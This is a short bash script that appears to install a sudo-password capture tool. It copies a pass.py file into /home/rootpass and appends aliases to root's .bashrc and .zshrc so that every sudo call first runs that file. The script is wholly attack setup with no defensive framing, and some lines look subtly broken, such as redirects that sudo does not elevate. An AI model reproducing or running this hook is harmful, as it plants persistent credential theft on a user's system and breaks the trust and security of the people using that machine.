#!/bin/bash
apt install python3 -y
sudo mkdir /home/rootpass
sudo echo "alias sudo=\'python3 /home/rootpass/pass.py && sudo\'" >> /root/.bashrc
sudo echo "alias sudo=\'python3 /home/rootpass/pass.py && sudo\'" >> /root/.zshrc
sudo mv ~/termuxloginpass/pass.py /home/rootpass
sudo chown root /home/rootpass/pass.py
sudo chmod 700 /home/rootpass/pass.py
